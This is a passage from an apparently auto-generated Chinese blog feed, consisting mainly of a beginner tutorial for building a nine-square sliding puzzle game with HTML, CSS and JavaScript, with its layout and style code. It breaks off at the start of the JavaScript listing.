class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">if</span> (con.<span class="property">childNodes</span>.<span class="property">length</span> == <span class="number">6</span>) {</span><br><span class="line">    con.<span class="title function_">removeChild</span>(con.<span class="property">lastChild</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记分</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">score</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> newscore = <span class="built_in">parseInt</span>($(<span class="string">'score'</span>).<span class="property">innerHTML</span>) + <span class="number">1</span>; <span class="comment">//分数加一</span></span><br><span class="line">  $(<span class="string">'score'</span>).<span class="property">innerHTML</span> = newscore; <span class="comment">//修改分数</span></span><br><span class="line">  <span class="keyword">if</span> (newscore % <span class="number">10</span> == <span class="number">0</span>) {</span><br><span class="line">    <span class="comment">//当分数是10 的倍数时使用加速函数，越来越快</span></span><br><span class="line">    <span class="title function_">speedup</span>();</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>仅仅一百多行代码我们就实现了一个简单有趣的 Web 小游戏。如果你刚入门前端，相信本项目可以很好的让你理解，练习如何使用 JavaScript 操作 DOM.</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 前端 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>h5拼图小游戏</title>
      
      
      <link href="/cn/posts/22493/"/>
      
      
      <url>/cn/posts/22493/</url>
      
      
        
      <content type="html"><![CDATA[<h1 id="内容介绍"><a href="#内容介绍" class="headerlink" title="内容介绍"></a>内容介绍</h1><h4 id="1-1-学习内容"><a href="#1-1-学习内容" class="headerlink" title="1.1 学习内容"></a>1.1 学习内容</h4><p>本项目是基于 HTML+CSS+JavaScript 实现网页版的拼图游戏。实现过程中将用到 HTML5，CSS3 及 JavaScript 相关知识。完成这个项目，可以进一步扎实前端基础知识。</p><p>九宫格拼图相信大家都玩过了，看似简单的小游戏，但实现起来其实并不那么简单。在以前，写程序是程序员的专利，只有他们才能做出一个软件来。但是现在不同了。科技的进步和经济的发展，使得每个人都可以使用计算机。特别是 HTML5 和 CSS3 的流行，使得制作一个基本的游戏变得简单。</p><p>下面我们就来做一个九宫格拼图。它的玩法是移动空格块旁边的方块，使得它们按照方块上面标的数字顺序排好。最终的效果：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/22493/document-uid920932labid465timestamp1551234014316.png" alt="此处输入图片的描述"></p><h4 id="1-2-实验知识点"><a href="#1-2-实验知识点" class="headerlink" title="1.2 实验知识点"></a>1.2 实验知识点</h4><p>本实验涉及以下知识点：</p><ul><li>HTML5</li><li>CSS3</li><li>JavaScript</li></ul><h4 id="1-3-实验环境"><a href="#1-3-实验环境" class="headerlink" title="1.3 实验环境"></a>1.3 实验环境</h4><ul><li>Vscode</li></ul><h4 id="1-4-适合人群"><a href="#1-4-适合人群" class="headerlink" title="1.4 适合人群"></a>1.4 适合人群</h4><p>本项目难度一般，适合刚学完前端基础（HTML+CSS+JavaScript）的同学作为练手项目。</p><h4 id="1-5-代码获取"><a href="#1-5-代码获取" class="headerlink" title="1.5 代码获取"></a>1.5 代码获取</h4><p>附件：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puzzle.zip</span><br></pre></td></tr></tbody></table></figure><h1 id="项目原理"><a href="#项目原理" class="headerlink" title="项目原理"></a>项目原理</h1><p>根据下面的效果图来观察思考，我们要做的就是设置一个大 DIV 用来包裹里面的小 DIV，然后在里面设置 8 个小 DIV，从 1 开始给他们编号。右边设置两个按钮，点击开始的时候开始计时，完成拼图后停止计时，并弹出一个框，提示完成了。重来按钮是当用户觉得当前有难度的时候，点击重来可以重新开始一个新的拼图，把所有方块打乱顺序，然后开始计时。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/22493/document-uid920932labid465timestamp1551234094402.png" alt="此处输入图片的描述"></p><p>我们的重点就是当鼠标点击其中一个方块时，要判断当前方块是否可移动，如果可移动，则移动到相应的位置，如不可移动，则不做任何事。当移动完一块后，要判断是否完成拼图。</p><p>我们把那个大 DIV 想象成一个盒子，它有九个位置，从 1 开始，到 9 编号，他们的位置和编号都是不会变的。把里面的 8 个小 DIV 想象成 8 个小盒子，给他们设置 top 和 left 就可以控制他们的位置。每个小 DIV 从 1 开始到 8 编号。他们的位置是可以随意改变的。所以当小 DIV 的编号和大 DIV 的编号全部重合时，就完成了拼图。</p><p>所以重点就只有一个了。那就是如何判断是否可移动。这个也简单。我们设置一个一维数组变量，用来保存大 DIV 它里面装的小 DIV 的编号。如果大 DIV 没有小方块，也就表面它是空白块，那么就设为 0。如果当前大 DIV 有小 DIV，那就设置为小 DIV 的编号。然后再设置一个二维数组变量，用来保存大 DIV 的可移动编号。也就是保存这个大 DIV 它所有的可去的位置。比如大 DIV 编号为 2 的，它只能向 1 号，3 号，5 号这三个方向移动。又比如 5，它能向 2、4、6、8 这四个方向移动。我们循环遍历这个变量，如果对应的方向它 没有方块，也就是值为 0，那么它就可以往这个方向移动了。</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>1.准备相关开发工具</p><p>2.建立下面的目录结构：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puzzle</span><br><span class="line">  |__puzzle.html</span><br><span class="line">  |__puzzle.css</span><br><span class="line">  |__puzzle.js</span><br></pre></td></tr></tbody></table></figure><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><h4 id="1-编写布局"><a href="#1-编写布局" class="headerlink" title="1.编写布局"></a>1.编写布局</h4><p>在<strong>puzzle.html</strong>中我们有下面的代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Puzzle<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"puzzle.css"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"puzzle.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--最外面的DIV，用来包含里面的结构--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"game"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--游戏区，也就是大DIV方块--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d1"</span> <span class="attr">onclick</span>=<span class="string">"move(1)"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--小DIV，也就是8个小方块。当点击的时候执行move()函数，参数是显示的编号，这样我们就知道点击了那个方块--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d2"</span> <span class="attr">onclick</span>=<span class="string">"move(2)"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d3"</span> <span class="attr">onclick</span>=<span class="string">"move(3)"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d4"</span> <span class="attr">onclick</span>=<span class="string">"move(4)"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d5"</span> <span class="attr">onclick</span>=<span class="string">"move(5)"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d6"</span> <span class="attr">onclick</span>=<span class="string">"move(6)"</span>&gt;</span>6<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d7"</span> <span class="attr">onclick</span>=<span class="string">"move(7)"</span>&gt;</span>7<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"d8"</span> <span class="attr">onclick</span>=<span class="string">"move(8)"</span>&gt;</span>8<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"control"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--游戏控制区--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">rowspan</span> <span class="attr">id</span>=<span class="string">"timeText"</span>&gt;</span>总用时<span class="tag">&lt;/<span class="name">rowspan</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">rowspan</span> <span class="attr">id</span>=<span class="string">"timer"</span>&gt;</span><span class="tag">&lt;/<span class="name">rowspan</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--显示游戏时间区域--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">rowspan</span> <span class="attr">id</span>=<span class="string">"start"</span> <span class="attr">onclick</span>=<span class="string">"start()"</span>&gt;</span>开始<span class="tag">&lt;/<span class="name">rowspan</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">rowspan</span> <span class="attr">id</span>=<span class="string">"reset"</span> <span class="attr">onclick</span>=<span class="string">"reset()"</span>&gt;</span>重来<span class="tag">&lt;/<span class="name">rowspan</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--显示控制按钮区域--&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>布局文件就写完了。这里为了简化逻辑，更易编写代码，我们把所有操作都封装了。只要执行 move(2)，就是点击了编号为 2 的小方块，后面的一系列操作都完成了。</p><h4 id="2-编写样式"><a href="#2-编写样式" class="headerlink" title="2.编写样式"></a>2.编写样式</h4><p>布局写完了，现在我们为游戏编写样式，使得它更漂亮。在这一步，大家就可以自己自由发挥了，你可以写出自己的风格，让游戏更漂亮。也可以添加更多的元素来装饰你的游戏。但是注意了，游戏 DIV 的大小如果改变了，一定要记得修改 js 代码，稍后我们会详细讲解。</p><p><strong>puzzle.css</strong></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">* {</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* *是通配符，给所有的元素去掉默认样式，因为有的浏览器会默认加上一些样式，这可能会给布局带来问题 */</span></span><br><span class="line"><span class="selector-tag">body</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 给body设置100%的高度和宽度，这样就会根据浏览器屏幕大小自动适配 */</span></span><br><span class="line"><span class="selector-id">#container</span> {</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">620px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">450px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">1px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 这是包裹所有元素的DIV，给他设置620px的宽和450px的高，这个大小可以设置为更大，但是不能小，至少要能包含里面所有的元素 */</span></span><br><span class="line"><span class="selector-id">#game</span> {</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">450px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">450px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#ffe171</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">#ffe171</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 这是游戏区的DIV，这个大小是计算出来的，取决于你的小方块的大小。这里我们设置小方块的大小为150px 150px，所以这个大小是150px*3，为450px */</span></span><br><span class="line"><span class="selector-id">#game</span> <span class="selector-tag">div</span> {</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">149px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">149px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">1px</span> <span class="number">1px</span> <span class="number">2px</span> <span class="number">#777</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#20a6fa</span>;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">  -webkit-<span class="attribute">transition</span>: <span class="number">0.3s</span>; <span class="comment">/*浏览器前缀，兼容其他浏览器 chrome*/</span></span><br><span class="line">  -moz-<span class="attribute">transition</span>: <span class="number">0.3s</span>; <span class="comment">/*firefox*/</span></span><br><span class="line">  -ms-<span class="attribute">transition</span>: <span class="number">0.3s</span>; <span class="comment">/*ie*/</span></span><br><span class="line">  -o-<span class="attribute">transition</span>: <span class="number">0.3s</span>; <span class="comment">/*opera*/</span></span><br><span class="line">  <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 这就是小方块的大小了，定位为绝对定位，这样改变位置不会影响其他元素的位置。宽高都是149px。注意了，我们还设置了box-shadow:1px 1px 2px #777 ；</span></span><br><span class="line"><span class="comment">它还有边框阴影，所以149px 加上边框1px，它的总宽度是150px 下面的transition：0.3s是设置过渡时间，这是css3的属性，它会让属性改变呈现过渡动画，所以</span></span><br><span class="line"><span class="comment">当我们改变方块的位置时，它会有一个动画，我们不必自己编写动画函数，这回让你疯狂*/</span></span><br><span class="line"><span class="selector-id">#game</span> <span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> {</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffe171</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*给方块设置鼠标悬停动画，当鼠标悬停在元素上面时，会用这里的属性替换上面的属性，移开后又会变为原来的，这里我们是把字体颜色改变*/</span></span><br><span class="line"><span class="selector-id">#control</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">450px</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*控制区，display:inline-block会让元素呈现块状元素的特性，使得可以改变大小，同时也会具有行内元素的特性，使得不会占据一行空间，float:right让元素浮动到</span></span><br><span class="line"><span class="comment">右边*/</span></span><br><span class="line"><span class="selector-id">#control</span> rowspan {</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">25px</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#222</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*设置控制区按钮的共同样式*/</span></span><br><span class="line"><span class="selector-id">#start</span> {</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">28px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">28px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#20a6fa</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffe171</span>;</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="number">1px</span> <span class="number">1px</span> <span class="number">2px</span> <span class="number">#ffe171</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span> <span class="number">#4c98f5</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*给start按钮设置属性。cursor:pointer属性让鼠标移到元素上面时会显示不同的鼠标形状，pointer是手型*/</span></span><br><span class="line"><span class="selector-id">#reset</span> {</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">28px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">28px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#20a6fa</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffe171</span>;</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="number">1px</span> <span class="number">1px</span> <span class="number">2px</span> <span class="number">#ffe171</span>; <span class="comment">/*字体阴影*/</span></span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>; <span class="comment">/*圆角属性*/</span></span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span> <span class="number">#4c98f5</span>; <span class="comment">/*盒子阴影*/</span></span><br><span class="line">  <span class="attribute">text-align</span>: center; <span class="comment">/*文字居中*/</span></span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*给Reset按钮设置属性*/</span></span><br><span class="line"><span class="selector-id">#d1</span> {</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d2</span> {</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">150px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d3</span> {</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">300px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d4</span> {</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">150px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d5</span> {</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">150px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d6</span> {</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">300px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d7</span> {</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">300px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d8</span> {</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">300px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*这是预先给每个小方块按照顺序排好位置*/</span></span><br></pre></td></tr></tbody></table></figure><p>好了，样式也编写好了。最后再编写一个 js 控制代码，我们的拼图就可以用了。编写样式的时候大家还是先根据我这里的来，等完成了整个游戏，了解游戏逻辑的时候你们再自己发挥想象力去更改样式，不然可能会出现未知的错误。</p><p>完成这步，打开 <code>puzzle.html</code> 应该能看到下面的效果了：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/22493/puzzle1.png" alt="img"></p><h4 id="3-控制代码的编写"><a href="#3-控制代码的编写" class="headerlink" title="3.控制代码的编写"></a>3.控制代码的编写</h4><p><strong>puzzle.js</strong></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span 